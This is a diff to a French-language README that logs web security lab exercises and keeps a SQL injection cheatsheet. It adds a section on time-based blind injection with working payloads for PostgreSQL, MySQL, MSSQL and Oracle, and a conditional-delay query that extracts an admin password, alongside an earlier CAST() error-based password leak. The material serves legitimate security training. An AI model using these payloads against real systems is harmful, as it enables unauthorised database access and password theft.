@@ -18,6 +18,7 @@ Bienvenue dans mon arsenal offensif. Ce dossier recense mes victoires sur les la
 - [x] 🔴 **Praticien** : [Blind SQL injection with conditional responses](./09-blind-sqli-conditional.md)
 - [x] 🟠 **Praticien** : [Blind SQL injection with conditional errors](./10-blind-sqli-errors.md)
 - [x] 🟠 **Praticien** : [Visible error-based SQL injection](./11-visible-error-sqli.md)
+- [x] 🔴 **Praticien** : [Blind SQL injection with time delays](./12-blind-sqli-time.md)
 ---
 
 ## ⚔️ L'Arsenal Tactique (Cheatsheet)
@@ -66,6 +67,17 @@ Bienvenue dans mon arsenal offensif. Ce dossier recense mes victoires sur les la
 *Forcer la base de données à afficher la donnée ciblée directement dans un message d'erreur à l'écran.*
 
 * **Data Leakage via CAST() (PostgreSQL / MSSQL) :** `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`
-    * *Méthode :* Demander à la base de données de convertir une chaîne de caractères (comme un mot de passe) en entier (INT). L'opération va crasher et l'erreur affichera la valeur impossible à convertir (ex: `ERROR: invalid input syntax for type integer: "le_mot_de_passe"`). Attention aux limites de caractères, supprimer la valeur d'origine du paramètre si nécessaire pour faire de la place au payload.        
+    * *Méthode :* Demander à la base de données de convertir une chaîne de caractères (comme un mot de passe) en entier (INT). L'opération va crasher et l'erreur affichera la valeur impossible à convertir (ex: `ERROR: invalid input syntax for type integer: "le_mot_de_passe"`). Attention aux limites de caractères, supprimer la valeur d'origine du paramètre si nécessaire pour faire de la place au payload.  
+
+### 7. Injections SQL en Aveugle Temporelles (Time-Based Blind)
+*Utiliser les délais de réponse du serveur pour exfiltrer des données quand il n'y a ni affichage ni erreur.*
+
+* **Vérification du moteur (Fingerprinting) :**
+    * *PostgreSQL :* `'||pg_sleep(10)--`
+    * *MySQL :* `' AND SLEEP(10)--`
+    * *MSSQL :* `'; WAITFOR DELAY '0:0:10'--`
+    * *Oracle :* `'||dbms_pipe.receive_message('a',10)--`
+* **Exfiltration (Ex: PostgreSQL) :** `'||(SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(4) ELSE pg_sleep(0) END FROM users WHERE username='admin')--`
+    * *Méthode :* Optimiser l'extraction manuellement avec une recherche dichotomique (utiliser `<` et `>`) pour trouver les caractères plus rapidement que le brute-force automatique.          
 
 
